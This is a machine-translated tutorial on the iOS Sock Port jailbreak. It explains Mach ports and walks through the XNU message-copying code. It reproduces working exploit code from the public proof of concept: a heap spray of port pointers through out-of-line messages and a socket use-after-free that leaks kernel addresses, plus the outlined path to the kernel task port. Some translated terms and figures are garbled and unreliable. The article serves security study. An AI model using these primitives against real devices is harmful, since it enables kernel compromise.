Foreword

In the previous article, we initially introduced the UAF principle and mentioned the Socket code in iOS 10.0 - 12.2 with a UAF Exploit for IN6P_OUTPUTOPTS, which is the key to the entire Sock Port Vulnerability. From this article, we will take a line of PUBLIC POC source code, and combine the XNU source code in-depth analysis and explanation.
What is Mach Port?
definition

Before introducing the Sock Port, we need to introduce the concept of Mach Port [1]:
Mach ports are a kernel-provided inter-process communication (IPC) mechanism used heavily throughout the operating system. A Mach port is a unidirectional, kernel-protected channel that can have multiple send endpoints and only one receive endpoint.
That is, Mach ports is the process-provided communication mechanism provided by the kernel, which is frequently used by the operating system. A Mach Port is a one-way pipe protected by kernel, which can have multiple transmitters, but only one receiving end.
Mach port corresponding to kernel objects

Mach port exists in the form of a Mach_Port_T handle, and each Mach_Port_t handle has a corresponding kernel object IPC_Port in the kernel space:
struct ipc_port {
    struct ipc_object ip_object;
    struct ipc_mqueue ip_messages;
    
    union {
    	struct ipc_space *receiver;
    	struct ipc_port *destination;
    	ipc_port_timestamp_t timestamp;
    } data;
    
    union {
    	ipc_kobject_t kobject; // task
    	ipc_importance_task_t imp_task;
    	ipc_port_t sync_inheritor_port;
    	struct knote *sync_inheritor_knote;
    	struct turnstile *sync_inheritor_ts;
    } kdata;
// ...

    The comparison is a KOBJECT member at +0x68. It is a Task object. Document given according to Apple: Task is a resource unit, which contains virtual address space, Mach Ports space, and thread space [2], it Similar to the process of the process, here we can simply understand that there is a corresponding TASK for each process, the kernel can manage process resources through Task, and implement inter-process communication through this mechanism.
Task object in the kernel

The structure in the NASK is as follows:
struct task {
    // ...
    /* Virtual address space */
    vm_map_t	map;		/* Address space description */
    queue_chain_t	tasks;	/* global list of tasks */
    
    // ...
    /* Threads in this task */
    queue_head_t		threads;
    
    // ...
    /* Port right namespace */
    struct ipc_space *itk_space;
    
    /* Proc info */
    void *bsd_info;
    // ...

    The MAP, Threads, and ITK_SPACE in the above code correspond to the above-mentioned virtual address space, MACH PORTS namespace, and thread space, and BSD_INFO is a proc object, which contains current process information, such as our familiar PID:
    struct	proc {
    LIST_ENTRY(proc) p_list;    /* List of all processes. */
    
    void * 		task;   /* corresponding task (static)*/
    pid_t		p_ppid; /* process's parent pid number */
    // ...
    pid_t		p_pid;  /* Process identifier. (static)*/
    // ...

    	PORT & TASK corresponds to the process

In a user state we can get the Task Port of the current process via the MACH_TASK_SELF_ variable or the MACH_TASK_SELF () macro function, so-called Task Port refers to the task port corresponding to the process as its KOBJECT, which has the port. The process "for what you want".

Therefore, as long as we can get the Task Port of the kernel to the kernel, you can do whatever you want. Sock port is essentially a legitimate kernel Task Port in a user state (also known as Task_for_PID (0), that is, TFP0).
Sock Port Overview

Sock Port Vulnerabilities Through Socket In6p_outputopts UAF mainly implements 3 Exploit Primitive:

    The IPC_Port address of the MACH_PORT handle leaks, in this way we can get the Task Port that applies its own process;
    Unstable kernel memory reading is achieved by means of a member of IN6P_OUTPUTOPTS;
    The release of the orthodontic Zone in the kernel is implemented by means of a member of the operation in6p_outputopts.

SOCK Port After a combination of these Primitive, the SOCKET UAF first got a controllable kernel address space through Socket UAF, then filled these spaces into the address of IPC_Port by Mach OOL Message, and finally replaced it with forged IPC_Port, at this time Ability to get a legal, controllable IPC_Port.

We then read all the processes by reading the BSD_INFO and Task_Prev of the Trise Task Port until PID = 0 we got KERNEL TASK, remove the Kernel Map to give us counterfeit IPC_Port, at this time, we will fake IPC_Port The disguised is a real Kernel Task Port.

The above is an overview of the SOCK Port. The detailed utilization process involves many knowledge of XNU, and every step is rich in detail, and the readers here only need to have a holistic understanding of the vulnerability, and will step by step in the next article Analyze these Primitive principles, and the detailed process of combining the primitive for TFP0.
Get the idea of ​​Port Address

The first key to the vulnerability is to get the Task Port address of the current process, which is also the content of this paper. Under normal circumstances, we can only get the handle of Task Port, if you want to get the address, there are two ideas:

    Leaked the PORT index table of the current process and query the actual address of Port by the handle;
    In some way, forcing the kernel to assign the Task Port to our readable kernel area, that is, UAF mode.

In fact, the PORT index table of the current process is indirectly referenced by Task Port, which we need to know that Task Port Address can get the position of the Port index table, so the way is not feasible. There are two key points for implementation 2: UAF & Assign Task Port Pointer, the former has been met by Socket UAF, and now only the latter.
Forcing the Nuclear Assignment Task Port Pointer

There is a key code in the Sock Port, which assigns a controlled number of IPC_Port pointers to the specified Target Port handle in the kernel:

// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}

There are three things to do this code:

    Assign a receiving port Q for receiving Mach OOL Message;
    Construct a MACH OOL Message and use the Target port that you want to get the address;
    Send MACH Message to the receiving port Q, because the MACH Message will pass the kernel, copy the OOL Message in the kernel, and the handle will be converted to the address during the replication process.

A key to this place is OOL Message, which is the key to triggering kernel replication. The full name of OOL Message is OUT-OF-line Message, which is called out of line because its message contains out-of-line memory, and Out-of-Line Memory is the recipient virtual address space. Outside the content. According to GNU DOC, OUT-OF-Line Memory will make COPYIN operations in the recipient's space, interesting things are if out-of-line is a MACH_PORT handle, convert it to the address of IPC_Port of the handle when copying.

Here we have learned how to force the kernel through OOL Message to assign Port Address methods, but know it to know what it is, then we will analyze this whole process from the XNU source code.
Analysis from XNU Source Code Mach OOL Message

The xnu version used by the author is XNU-4903.221.2, and the commit hash in the analysis is A449C6A3B8014D9406C2DDBDC81795DA24AA7443.

We started from sending messages, breakpoints, breaking points, I can know that Mach_MSG will eventually call the kernel's MACH_MSG_TRAP function, we open the XNU source code can see Mach_MSG_TRAP is actually a simple package for MACH_MSG_OVERWRITE_TRAP:
mach_msg_return_t
mach_msg_trap(
	struct mach_msg_overwrite_trap_args *args)
{
    kern_return_t kr;
    args->rcv_msg = (mach_vm_address_t)0;
    
    kr = mach_msg_overwrite_trap(args);
    return kr;
}

Let's go to the MACH_MSG_OVERWRITE_TRAP function, first see the beginning of the function:
mach_msg_return_t
mach_msg_overwrite_trap(
	struct mach_msg_overwrite_trap_args *args)
{
    mach_vm_address_t	msg_addr = args->msg;
    mach_msg_option_t	option = args->option;
    mach_msg_size_t	send_size = args->send_size;
    mach_msg_size_t	rcv_size = args->rcv_size;
    mach_port_name_t	rcv_name = args->rcv_name;
    mach_msg_timeout_t	msg_timeout = args->timeout;
    mach_msg_priority_t override = args->override;
    mach_vm_address_t	rcv_msg_addr = args->rcv_msg;
    __unused mach_port_seqno_t temp_seqno = 0;
    
    mach_msg_return_t  mr = MACH_MSG_SUCCESS;
    vm_map_t map = current_map();
    
    /* Only accept options allowed by the user */
    option &= MACH_MSG_OPTION_USER;
    
    if (option & MACH_SEND_MSG) {
        // ...
    }
    
    if (option & MACH_RCV_MSG) {
        // ...
    }
    
    // ...

First, the parameters incorporated from the user state will be prepared from the environment of subsequent processing. The next code is the judgment of Option. It can be seen that the sending and receiving message has a function, because our incoming Option contains Mach_send_msg Next, you will walk to the branch logic sent by the message:

if (option & MACH_SEND_MSG) {
    ipc_space_t space = current_space();
    ipc_kmsg_t kmsg;
    
    // 1. create kmsg and copy header
    mr = ipc_kmsg_get(msg_addr, send_size, &kmsg);
    
    if (mr != MACH_MSG_SUCCESS) {
    	return mr;
    }
    
    // 2. copy body
    mr = ipc_kmsg_copyin(kmsg, space, map, override, &option);
    
    if (mr != MACH_MSG_SUCCESS) {
    	ipc_kmsg_free(kmsg);
    	return mr;
    }
    
    // 3. send message
    mr = ipc_kmsg_send(kmsg, option, msg_timeout);
    
    if (mr != MACH_MSG_SUCCESS) {
    	mr |= ipc_kmsg_copyout_pseudo(kmsg, space, map, MACH_MSG_BODY_NULL);
    	(void) ipc_kmsg_put(kmsg, option, msg_addr, send_size, 0, NULL);
    	return mr;
    }
}

There are three key steps in the branch logic of the message sending:

     Create a KMSG through Mach Message, KMSG is the data structure of Mach Message in the kernel;
     Copy Mach Message Body to KMSG;
     Send KMSG.

Below we will explain the first two steps in detail. They are the key to the entire Mach Ool Message Spraying:
Construction KMSG

The kernel implements the KMSG structure by calling IPC_KMSG_get. Below is the full picture of IPC_KMSG_get except the debug information and some judgment logic:
mach_msg_return_t
ipc_kmsg_get(
    mach_vm_address_t	msg_addr, // user space mach_msg_addr
    mach_msg_size_t	size, // send size = mach_msg_hdr->msgh_size = sizeof(mach_msg)
    ipc_kmsg_t		*kmsgp) // kmsg to return
{
    mach_msg_size_t		msg_and_trailer_size;
    ipc_kmsg_t 			kmsg;
    mach_msg_max_trailer_t	*trailer;
    mach_msg_legacy_base_t      legacy_base;
    mach_msg_size_t             len_copied;
    legacy_base.body.msgh_descriptor_count = 0;
    
    // 1. copy mach header & body to kernel legacy_base
    len_copied = sizeof(mach_msg_legacy_base_t);
    if (copyinmsg(msg_addr, (char *)&legacy_base, len_copied))
    	return MACH_SEND_INVALID_DATA;
    
    msg_addr += sizeof(legacy_base.header);
    // arm64 fixup
    size += LEGACY_HEADER_SIZE_DELTA;
    
    // 2. create a kmsg
    msg_and_trailer_size = size + MAX_TRAILER_SIZE;
    kmsg = ipc_kmsg_alloc(msg_and_trailer_size);
    if (kmsg == IKM_NULL)
    	return MACH_SEND_NO_BUFFER;
    
    // 2.1 init kernel mach_header
    kmsg->ikm_header->msgh_size	= size;
    kmsg->ikm_header->msgh_bits = legacy_base.header.msgh_bits;
    kmsg->ikm_header->msgh_remote_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_remote_port);
    kmsg->ikm_header->msgh_local_port = CAST_MACH_NAME_TO_PORT(legacy_base.header.msgh_local_port);
    kmsg->ikm_header->msgh_voucher_port = legacy_base.header.msgh_voucher_port;
    kmsg->ikm_header->msgh_id = legacy_base.header.msgh_id;
    
    // 3. copy userspace mach body to kernel
    if (copyinmsg(msg_addr, (char *)(kmsg->ikm_header + 1), size - (mach_msg_size_t)sizeof(mach_msg_header_t))) {
    	ipc_kmsg_free(kmsg);
    	return MACH_SEND_INVALID_DATA;
    }
    
    // 4. init kmsg trailer
    trailer = (mach_msg_max_trailer_t *) ((vm_offset_t)kmsg->ikm_header + size);
    trailer->msgh_sender = current_thread()->task->sec_token;
    trailer->msgh_audit = current_thread()->task->audit_token;
    trailer->msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;
    trailer->msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;
    trailer->msgh_labels.sender = 0;
    
    *kmsgp = kmsg;
    return MACH_MSG_SUCCESS;
}

The construction process of the entire KMSG is more complicated, mainly including 4 steps:

    In the kernel, create a MACH_MSG_LACY_BASE_T object, which is actually a basic structure of a MACH_MESSAGE, and then copy the user space Mach header and body and body to the MACH_MSG_LACY_BASE_T object via COPYINMSG, the main purpose is to facilitate access to the MACH data structure of the message in the kernel;

Typedef struct
{
    Mach_msg_legacy_header_t header;
    Mach_msg_body_t body;
} MACH_MSG_LEGACY_BASE_T;
Copy code

    Create a KMSG data structure, KMSG contains all the data of the MACH message and contains additional buffer to compatibility with the 64-bit system to send messages to the 32-bit system;
    Copy the MACH message body of the user space to KMSG;
    Initializing the TRALLER of KMSG, Trailler is a growing data structure located at the tail of the KMSG, which is used to carry some additional information.

This part of the most complex part is the creation of the second step KMSG, which is the complexity of the entire KMSG space, involving a large number of addresses and size calculations. Since the entire process is very lengthy boring, here is directly conclusively, interested readers You can construct a whole KMSG data body in a way yourself.
/***
 *  |-kmsg(84)-|---body(60)---|-mach_msg_hdr(24)-|-mach_msg_body(4)-|-descriptor(16)-|-trailer(0x44)-|
 *      |                       ^
 *      |                       |
 *   ikm_header ----------------|
 */


 The MACH Message structure sent by the visible user space is placed behind the KMSG body, including Header, Body, and Descriptor three parts, followed by a trailer.

In fact, the Body area is reserved, which is used to handle KMSG to accommodate Descriptor, which can be seen in the comment starting at the beginning of IPC_KMSG_alloc:
/*
 * LP64support -
 * Pad the allocation in case we need to expand the
 * message descrptors for user spaces with pointers larger than
 * the kernel's own, or vice versa.  We don't know how many descriptors
 * there are yet, so just assume the whole body could be
 * descriptors (if there could be any at all).
 *
 * The expansion space is left in front of the header,
 * because it is easier to pull the header and descriptors
 * forward as we process them than it is to push all the
 * data backwards.
 */

 That is, when the descriptor of the user space is greater than the kernel space, we can move KMSG from Mach_msg_Header as a whole to leave the space for Description. The reason why the space reserved on the left is because the memory space behind KMSG may have been occupied, and it is easier to pull the header forward than the backward promotion.
Copy the remaining part of the user space to KMSG

After the constructing KMSG, we only completed the replication of Header and Body. Among them, Body contains the information of Descriptor. The next job is to assign the remaining part of the value of the IPC_KMSG_COPYIN function, and the Ool Memory in the OOL Message is converted into in-line. Memory.

Let's look at the implementation of IPC_KMSG_COPYIN:

mach_msg_return_t
ipc_kmsg_copyin(
	ipc_kmsg_t		kmsg,
	ipc_space_t		space,
	vm_map_t		map,
	mach_msg_priority_t     override,
	mach_msg_option_t	*optionp)
{
    mach_msg_return_t mr;
    
    kmsg->ikm_header->msgh_bits &= MACH_MSGH_BITS_USER;
    
    // 1. copy header rights
    mr = ipc_kmsg_copyin_header(kmsg, space, override, optionp);
    
    if (mr != MACH_MSG_SUCCESS)
    return mr;
    
    if ((kmsg->ikm_header->msgh_bits & MACH_MSGH_BITS_COMPLEX) == 0)
        return MACH_MSG_SUCCESS;
    
    // 2. copy body
    mr = ipc_kmsg_copyin_body(kmsg, space, map, optionp);
    
    return mr;
}

There are two main steps here:

     Copy the user space Mach Message Rights to KMSG. The Rights here refers to the ability of Port to send and receive;
     Copy the Descriptor to KMSG, and create the corresponding kernel space to complete the address space conversion based on the descriptor to create the corresponding kernel space based on the Descriptor.

Here we focus on step 2. It is the key to force the kernel to complete the conversion and pointer distribution from the Port handle to the Port Address. Below is the author in ARM64 and the above OOL MESSAGE method.

mach_msg_return_t
ipc_kmsg_copyin_body(
	ipc_kmsg_t	kmsg,
	ipc_space_t	space,
	vm_map_t    map,
	mach_msg_option_t *optionp)
{
    ipc_object_t dest;
    mach_msg_body_t	*body;
    mach_msg_descriptor_t *user_addr, *kern_addr;
    mach_msg_type_number_t dsc_count;
    boolean_t is_task_64bit = (map->max_offset > VM_MAX_ADDRESS);
    boolean_t complex = FALSE;
    vm_size_t space_needed = 0;
    vm_offset_t	paddr = 0;
    vm_map_copy_t copy = VM_MAP_COPY_NULL;
    mach_msg_type_number_t i;
    mach_msg_return_t mr = MACH_MSG_SUCCESS;
    
    // 1. init descriptor size
    vm_size_t descriptor_size = 0;
    
    dest = (ipc_object_t) kmsg->ikm_header->msgh_remote_port;
    body = (mach_msg_body_t *) (kmsg->ikm_header + 1);
    dsc_count = body->msgh_descriptor_count;
    
    /*
     * Make an initial pass to determine kernal VM space requirements for
     * physical copies and possible contraction of the descriptors from
     * processes with pointers larger than the kernel's.
     */
    daddr = NULL;
    for (i = 0; i < dsc_count; i++) {
        /* make sure the descriptor fits in the message */
        descriptor_size += 16;
    }
    
    /*
     * Allocate space in the pageable kernel ipc copy map for all the
     * ool data that is to be physically copied.  Map is marked wait for
     * space.
     */
    if (space_needed) {
        if (vm_allocate_kernel(ipc_kernel_copy_map, &paddr, space_needed,
                    VM_FLAGS_ANYWHERE, VM_KERN_MEMORY_IPC) != KERN_SUCCESS) {
            mr = MACH_MSG_VM_KERNEL;
            goto clean_message;
        }
    }
    
    /* user_addr = just after base as it was copied in */
    user_addr = (mach_msg_descriptor_t *)((vm_offset_t)kmsg->ikm_header + sizeof(mach_msg_base_t));
    
    // 2. pull header forward if needed
    /* Shift the mach_msg_base_t down to make room for dsc_count*16bytes of descriptors */
    if (descriptor_size != 16 * dsc_count) {
        vm_offset_t dsc_adjust = 16 * dsc_count - descriptor_size;
        memmove((char *)(((vm_offset_t)kmsg->ikm_header) - dsc_adjust), kmsg->ikm_header, sizeof(mach_msg_base_t));
        kmsg->ikm_header = (mach_msg_header_t *)((vm_offset_t)kmsg->ikm_header - dsc_adjust);
        /* Update the message size for the larger in-kernel representation */
        kmsg->ikm_header->msgh_size += (mach_msg_size_t)dsc_adjust;
    }
    
    /* kern_addr = just after base after it has been (conditionally) moved */
    kern_addr = (mach_msg_descriptor_t *)((vm_offset_t)kmsg->ikm_header + sizeof(mach_msg_base_t));
    
    // 3. copy ool ports to kernel zone
    /* handle the OOL regions and port descriptors. */
    for (i = 0; i < dsc_count; i++) {
        user_addr = ipc_kmsg_copyin_ool_ports_descriptor((mach_msg_ool_ports_descriptor_t *)kern_addr, 
    			            user_addr, is_task_64bit, map, space, dest, kmsg, optionp, &mr);
        kern_addr++;
        complex = TRUE;    
    }
    
    if (!complex) {
        kmsg->ikm_header->msgh_bits &= ~MACH_MSGH_BITS_COMPLEX;
    }
    
    return mr;


This function is more complicated, and the author has marked three key steps with annotations:

     Initialize Descriptor Size, which is the user space size of Mach_MSG_OOL_PORTS_DESCRIPTOR_T;
     If you find that kmsg can't accommodate the user space, the mach_msg_ool_ parts_descriptor_t, and move KMSG from the header as a whole, leaving enough space for Descriptor, which is consistent with the description of the KMSG Body Expand Size mentioned above;
     Copy the OOL Ports to the kernel address space, which contains a conversion from the Port handle to IPC_PORT Address.

Since our body contains only one design, and the user space size is consistent with the kernel space, there is no need for Pull Header Forward. Next, we finally come to the highlight of this article: OOL PORTS conversion.

The conversion from the Port handle to the address is completed by calling ipc_kmsg_copyin_ool_PORTS_DEScriptor function. Let's take a look at the implementation of this function:

mach_msg_descriptor_t *
ipc_kmsg_copyin_ool_ports_descriptor(
	mach_msg_ool_ports_descriptor_t *dsc,
	mach_msg_descriptor_t *user_dsc,
	int is_64bit,
	vm_map_t map,
	ipc_space_t space,
	ipc_object_t dest,
	ipc_kmsg_t kmsg,
	mach_msg_option_t *optionp,
	mach_msg_return_t *mr)
{
    void *data;
    ipc_object_t *objects;
    unsigned int i;
    mach_vm_offset_t addr;
    mach_msg_type_name_t user_disp;
    mach_msg_type_name_t result_disp;
    mach_msg_type_number_t count;
    mach_msg_copy_options_t copy_option;
    boolean_t deallocate;
    mach_msg_descriptor_type_t type;
    vm_size_t ports_length, names_length;
    
    mach_msg_ool_ports_descriptor64_t *user_ool_dsc = (typeof(user_ool_dsc))user_dsc;
    addr = (mach_vm_offset_t)user_ool_dsc->address;
    count = user_ool_dsc->count;
    deallocate = user_ool_dsc->deallocate;
    copy_option = user_ool_dsc->copy;
    user_disp = user_ool_dsc->disposition;
    type = user_ool_dsc->type;
    
    user_dsc = (typeof(user_dsc))(user_ool_dsc+1);
    
    dsc->deallocate = deallocate;
    dsc->copy = copy_option;
    dsc->type = type;
    dsc->count = count;
    dsc->address = NULL;  /* for now */
    
    result_disp = ipc_object_copyin_type(user_disp);
    dsc->disposition = result_disp;
    
    // 1. calculate port_pointers length and port_names length
    /* calculate length of data in bytes, rounding up */
    if (os_mul_overflow(count, sizeof(mach_port_t), &ports_length)) {
        *mr = MACH_SEND_TOO_LARGE;
        return NULL;
    }
    if (os_mul_overflow(count, sizeof(mach_port_name_t), &names_length)) {
        *mr = MACH_SEND_TOO_LARGE;
        return NULL;
    }
    
    // 2. alloc kenrel zone for port pointers
    data = kalloc(ports_length);
    mach_port_name_t *names = &((mach_port_name_t *)data)[count];
    if (copyinmap(map, addr, names, names_length) != KERN_SUCCESS) {
        kfree(data, ports_length);
        *mr = MACH_SEND_INVALID_MEMORY;
        return NULL;
    }
    
    if (deallocate) {
        (void) mach_vm_deallocate(map, addr, (mach_vm_size_t)ports_length);
    }
    
    objects = (ipc_object_t *) data;
    // 3. 替换 ool address 为 kernel address
    dsc->address = data;
    
    for ( i = 0; i < count; i++) {
        mach_port_name_t name = names[i];
        ipc_object_t object;
    
        if (!MACH_PORT_VALID(name)) {
            objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);
            continue;
        }
        
        // 4. convert port_name to port_addr
        kern_return_t kr = ipc_object_copyin(space, name, user_disp, &object);
    
        if (kr != KERN_SUCCESS) {
            unsigned int j;
    
            for(j = 0; j < i; j++) {
                object = objects[j];
                if (IPC_OBJECT_VALID(object))
                    ipc_object_destroy(object, result_disp);
            }
            kfree(data, ports_length);
            dsc->address = NULL;
    		if ((*optionp & MACH_SEND_KERNEL) == 0) {
    			mach_port_guard_exception(name, 0, 0, kGUARD_EXC_SEND_INVALID_RIGHT);
    		}
            *mr = MACH_SEND_INVALID_RIGHT;
            return NULL;
        }
    
        if ((dsc->disposition == MACH_MSG_TYPE_PORT_RECEIVE) &&
                ipc_port_check_circularity(
                    (ipc_port_t) object,
                    (ipc_port_t) dest))
            kmsg->ikm_header->msgh_bits |= MACH_MSGH_BITS_CIRCULAR;
    
        objects[i] = object;
    }
    
    return user_dsc;
}

This code is equally complicated, and the author has marked 4 key steps:

     Calculate the space size required for IPC_Port Pointer, and the size of the MACH_PORT handle array in the user space;
     The allocation space in the kernel is used to accommodate the IPC_Port Pointer array that is converted from the handle array. This place's ports_length is some puzzle, theoretically calculates count * sizeof (Mach_Port_t *), if you use count * sizeof (Mach_Port_t) as a Kalloc parameter Can Pointers? Is Kalloc has some special memory allocation rules, looking at the high guidance;
     Replace the OOL Address in the KMSG as the kernel address assigned in step 2;
     Complete the conversion from the Port handle to Port Address.

The focus is step 4, which converts a handle to IPC_Port Pointer by calling IPC_Object_Copyin, let's see its implementation:

kern_return_t
ipc_object_copyin(
	ipc_space_t		space,
	mach_port_name_t	name,
	mach_msg_type_name_t	msgt_name,
	ipc_object_t		*objectp)
{
    ipc_entry_t entry;
    ipc_port_t soright;
    ipc_port_t release_port;
    kern_return_t kr;
    int assertcnt = 0;

    // 1. find port in is_table
    kr = ipc_right_lookup_write(space, name, &entry);
    if (kr != KERN_SUCCESS)
        return kr;
    
    release_port = IP_NULL;
    // 2. copy to kernel ipc_object
    kr = ipc_right_copyin(space, name, entry,
    		      msgt_name, TRUE,
    		      objectp, &soright,
    		      &release_port,
    		      &assertcnt);
    // ...
    
    return kr;
}

There are two main key steps here:

     Get Port Address in the current IPC Space Port indexing table based on Port_name;
     Copy port right to the IPC_OBject object in the kernel.

The key here is the first step. It realizes the handle to the address conversion through IPC_RIGHT_LOOKUP_WRITE. It is a package of IPC_ENTRY_LOOKUP. We directly look at the latter's implementation:

ipc_entry_t
ipc_entry_lookup(
	ipc_space_t		space,
	mach_port_name_t	name)
{
    mach_port_index_t index;
    ipc_entry_t entry;
    
    assert(is_active(space));
    
    // 1. get index from port name
    index = name >> 8;
    if (index <  space->is_table_size) {
        // 2. get port address by index from is_table
        entry = &space->is_table[index];
    	if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||
    	    IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE) {
    		entry = IE_NULL;		
    	}
    }
    else {
    	entry = IE_NULL;
    }
    
    assert((entry == IE_NULL) || IE_BITS_TYPE(entry->ie_bits));
    return entry;
}

From here we can see that the index information in the Port handle starts from the 8th place, so the port name moves 8 digits to the right to get the port index, and then find the address to return in the index table.

At this point we have fully understood why we can force the kernel to allocate the principle of specifying the IPC_PORT POINTERS of Port by sending the Mach Ool Message. Next, we start to analyze how to get this address.
Get Port Address through OOL MESSAGE and Socket UAF

The thinking here is very clear. We only need to use the socket UAF to get a release area, and then send a large amount of OOL Message messages, and make the PORT array consistent with the size of the release area. The area that has been released, let's look at the code in the Sock Port:

// first primitive: leak the kernel address of a mach port
uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
    // here we use the uaf as an info leak
    // 1. make dangling socket option zone
    int sock = get_socket_with_dangling_options();
    
    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        
        // 2. send ool message
        mach_port_t p = fill_kalloc_with_port_pointer(port, 192/sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
        
        int mtu;
        int pref;
        
        // 3. get option and check if it is a kernel pointer
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
        
        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)
        
        /*  from a hex dump:
         
         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */
        
        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up
        
        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }
    
    // close that socket.
    close(sock);
    return 0;
}


Here is 4 key steps:

     Using Socket UAF to make an IN6P_OUTPUTOPTS size release area, detailed procedure can be seen: iOS Jailbreak Principles - Sock Port Vulnerability parsing (1) UAF with Heap Spraying or Sock Port Write-Up;
     Send OOL Message, because in6p_outputopts size is 192b, a port pointer size is 8B, so we need to send 192/8 = 24 ool_ports;
     Two continuous member variables of IN6P_OUTPUTOPTS stitching out a 64-bit address;
     Determine if the address obtained in step 3 is a kernel object pointer, if it is a kernel object pointer, we succeed, the address is the address of the target port.

Here we focus on the 3rd and 4 steps:
Read an 8B area via Socket Option

According to IN6P_OUTPUTOPTS:
struct	ip6_pktopts {
    struct	mbuf *ip6po_m;	
    int	        ip6po_hlim;	
    struct	in6_pktinfo *ip6po_pktinfo;
    struct	ip6po_nhinfo ip6po_nhinfo;
    struct	ip6_hbh *ip6po_hbh; 
    struct	ip6_dest *ip6po_dest1;
    struct	ip6po_rhinfo ip6po_rhinfo;
    struct	ip6_dest *ip6po_dest2;
    int	ip6po_tclass;
    int	ip6po_minmtu; // +180
    int	ip6po_prefer_tempaddr; // + 184
    int ip6po_flags;
};

Minmtu and IP6PO_PREFER_TEMPADDR are located in the +180 and +184 area of ​​the structure, respectively, because each Pointer is 8B, the nearest Pointer is located in the +176 ~ +184 and +184 ~ + 192 area, so we can read the previous Pointer by minmtu High 32-bit, can read the lower 32 bits of the next pointer through IP6PO_PREFER_TEMPADDR, and because heap spraying is successful, these Pointers point to Target IPC_Port, so we can use them to splicing a complete Pointer Address, the splicing method is Minmtu left shift 32-bit or IP6PO_PREFER_TEMPADDR:

UINT64_T PTR = ((UINT64_T) MTU << 32) & 0xffffffff00000000) | ((UINT64_T) pref & 0x000000FFFFFFFF);
Copy code

Judging whether it is the address of the kernel object pointer

The following most important steps are how to determine which is an effective kernel address, here you need two basics:

    If the content in the memory is 0xDeadbeef, this area has not yet completed initialization [3];
    According to the definition in Mach / ARM / VM_PARAM.H in the XNU, the valid range of the kernel address is from 0xFffffe000000000 ~ 0xffffe000000000 ~ 0xFfffffff3ffffffff, generally 32 bits of Port AddRESS is 0xffffe.

The above two points have the following judgment code:

if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
    mach_port_destroy(mach_task_self(), p);
    close(sock);
    return ptr;
}


If you meet the conditions, we have got the port address.
Summarize

This article first introduces the user space and kernel space representation and its functions of Mach Port; then briefly introduces the implementation mechanism of SOCK Port; then in the first key point of the vulnerability (leaking port addr by OOL Message), combined with XNU The source code is analyzed in-depth analysis of the principle of IPC_Port Pointers Spraying; finally combined with the SOCK Port source code to analyze the process of getting the Port Address.

Through this section, I believe that you have a more in-depth understanding of the Mach Port of Mach Port and Heap Spraying.
Next day notice

Through Socket UAF, not only the disclosure port address, but also the release of any address and the release of any kernel ZONE. In the next section, we will introduce the principle and procedures of the above Primitives based on iSurface's Heap Spraying and Socket UAF.